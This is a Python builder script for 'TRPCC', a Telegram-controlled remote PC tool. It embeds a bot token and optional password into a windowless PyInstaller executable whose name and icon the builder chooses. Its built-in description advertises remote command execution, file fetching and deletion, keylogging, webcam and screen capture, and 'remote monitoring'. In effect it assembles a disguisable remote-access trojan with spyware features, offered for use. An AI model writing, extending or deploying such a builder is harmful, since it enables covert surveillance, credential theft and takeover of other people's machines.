# Telegram Remote PC Controller (TRPCC) main file. Assembling the client side binary file, dependencies installing, etc.

# Imports.
from trpcc_utils import print_icon, styled, clrscr, Fore

from trpcc_deps import install_deps

from json import dump

from os import system, remove, mkdir, getcwd

from os.path import exists

from shutil import rmtree, move

from time import sleep


# Icon :)
clrscr(); print_icon();

# Print menu.
pmenu = lambda: print(f'{"-" * 10} TRPCC 2.0 Commands List {"-" * 10}\n1. Assembly client side binary file.\n2. Install dependencies.\n3. About TRPCC.\n4. Exit.\n{"-"*45}\n')

pmenu()

# Utility functions.
def no_blank_input(placeholder: str) -> str:
    while 1:
        _input = input(placeholder)

        if _input:
            return _input

def rma_ifne(file: str, tree: bool=False) -> None:
    if exists(file): remove(file) if not tree else rmtree(file)

def clear_pcache() -> None:
    try: rma_ifne('__pycache__', 1)
    except: ...

# Main loop.
while 1:
    try:
        # Option input.
        command = input('---> ')

        # Assembly binary.
        if command == '1':
            clrscr(); print_icon(); print('\n')

            name = no_blank_input('Application name -> ').strip()

            icon = input('[OPTIONAL] Icon -> ').strip() or None

            token = no_blank_input('Bot token -> ').strip()

            password = input('[OPTIONAL] Bot password -> ').strip() or None

            clrscr(); print_icon(); print('\n')

            with open('MEIPASS_DATA.json', 'w') as meipass:
                dump({'TOKEN': token, 'NAME': name, 'PASSWORD': password}, meipass)

            print('INFO: RTD written successfully.')

            if not exists('csbin'):
                mkdir('csbin')

                print('INFO: CSBIN directory created.')

            else:
                print('INFO: No need for creating CSBIN directory.')

            print('INFO: Passing a command to assemble client side binary file...')

            system(f'pyinstaller trpcc_client.py -F -n="{name}" {f"--icon={icon}" if icon else ""} --noconsole --add-binary="MEIPASS_DATA.json;." --version-file=META.dat')

            print('\nINFO: Finished assembling. Check for status.')

            remove('MEIPASS_DATA.json')

            print('INFO: RTD erased successfully.')

            try:
                rma_ifne(f'{name}.spec')

                rma_ifne('__pycache__', 1)

                rma_ifne('build', 1)
            except PermissionError:
                print('WARNING: Failed to clean cache (1).')

            print('INFO: Cache cleaned (1).')

            if exists('dist'):
                move(f'dist/{name}.exe', f'./csbin/{name}.exe')

                print('INFO: Binary file assembled.')

                try:
                    rmtree('dist')
                except PermissionError:
                    print('WARNING: Failed to clean cache (2).')

            print('INFO: Cache cleaned (2).')

            _winsep = '\\'

            print(styled(f'\nFinished assembling client side binary file. Search for: "{getcwd().replace(_winsep, "/")}/csbin/{name}.exe".', Fore.GREEN, bold=True))

            input('\nPress enter to finish... ')

            clrscr(); print_icon(); pmenu()

        # Install dependencies.
        elif command == '2':
            install_deps()

            sleep(1.5)

            clrscr(); print_icon(); pmenu()

        # About TRPCC.
        elif command == '3':
            print('''\nTRPCC (Telegram Remote PC Controller) is a software for controlling PC remotely via Telegram bot. It includes robust features like file and directory management (insertion, fetching, deletion, renaming, and movement), execution of system commands, process management, and advanced key logging system. Users can also interact with hardware components such as the mouse, keyboard, webcam, and monitors, as well as capture screenshots and play or manage sounds, ETC!

The bot supports password protection for secure access. It is designed for seamless operation across platforms, providing flexibility for various tasks, whether automation, remote monitoring, or system management. With its comprehensive toolset, this bot offers an efficient way to handle a wide range of system operations remotely via Telegram.

https://github.com/xzripper/trpcc 2.0 by https://github.com/xzripper.\n''')

            input('Press enter to finish reading... ')

            clrscr(); print_icon(); pmenu()

        # Exit.
        elif command == '4':
            print('\nBye!')

            sleep(.5)

            clrscr()

            clear_pcache()

            exit(0)

        # Invalid option.
        else:
            print(styled('\nNonexistent option!\n', Fore.RED, bold=True))

            sleep(1); clrscr(); print_icon(); pmenu()
    except KeyboardInterrupt:
        if input('\n\nAre you sure? (Y/n): ').lower() == 'y':
            print('\nBye!')

            sleep(.5)

            clrscr()

            clear_pcache()

            exit(0)

        print()

    except Exception as exception:
        print(styled(f'\nGot unexpected exception: `{str(exception)}` (representation of it).\n', Fore.RED, bold=True))
